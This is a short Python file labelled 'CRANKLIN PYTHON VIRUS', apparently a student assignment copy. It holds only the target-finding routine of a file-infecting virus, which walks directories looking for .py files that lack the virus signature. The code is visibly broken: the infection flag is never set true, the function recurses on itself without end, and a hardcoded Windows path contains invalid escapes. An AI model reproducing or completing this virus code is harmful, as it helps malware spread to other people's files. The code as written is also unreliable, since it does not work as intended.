import os
import datetime
import random, array

SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = False
                    break
            if infected == True:
                filestoinfect.append(path+"/"+fname)
    filestoinfect = search(os.path.abspath("\Users\MANO\Downloads\ECS 189M\progAss1"))
    for fname in filestoinfect:
        print ("kjhkjh")
        print (fname)
    return filestoinfect
	
